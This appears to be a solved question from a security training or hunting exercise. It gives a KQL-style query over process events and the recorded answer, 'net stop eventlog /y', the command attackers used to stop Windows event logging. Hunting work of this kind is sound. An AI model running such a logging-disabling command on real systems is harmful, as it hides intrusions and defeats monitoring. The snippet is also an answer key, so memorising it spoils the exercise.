//Which command did the attackers run to stop the Windows Event Log Service?

ProcessEvents
  | where username contains "anbartlett"
  | where process_commandline contains "eventlog" or process_commandline contains "stop"
//net stop eventlog /y ; 2023-08-10T16:20:55.000Z
